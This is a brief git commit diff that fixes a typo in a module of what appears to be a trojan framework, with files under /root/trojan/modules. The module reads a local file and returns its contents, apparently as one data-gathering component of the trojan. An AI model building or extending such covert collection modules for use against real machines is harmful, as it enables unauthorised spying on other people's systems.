fb975ad5ab11fb357c798f31aa15d07f97522b21
craigcullen <craig340@gmail.com>
2015-12-20 16:25:50 -0700

    Changes to file_id

--- modules/file_id.py
+++ modules/file_id.py
@@ -3,5 +3,5 @@ import os
 def run(**args):
     print "[*] In file_id module."
     with open ('/root/trojan/modules/environment.py', 'rb') as fin:
-        file = fin.ready()
+        file = fin.read()
     return file
